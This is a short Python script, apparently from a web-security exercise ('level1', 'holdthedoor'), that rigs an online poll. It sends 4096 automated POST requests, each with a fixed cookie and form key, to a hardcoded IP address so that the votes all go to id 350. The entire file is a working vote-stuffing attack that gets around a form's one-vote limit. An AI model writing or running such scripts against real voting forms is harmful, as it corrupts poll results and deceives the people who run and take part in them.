#!/usr/bin/python3
import requests


def cheat_vote(times=1):
    """cheat_vote - cheat online voting form
    Args:
        times (int): number of times to vote

    """
    payload = {'id': '350', 'holdthedoor': 'Submit', 'key': '0'}
    url = "http://158.69.76.135/level1.php"

    session = requests.Session()
    cookies = dict(HoldTheDoor='0')
    for i in range(times):
        r = session.post(url, payload, cookies=cookies)


if __name__ == '__main__':
    times = 4096
    cheat_vote(times)
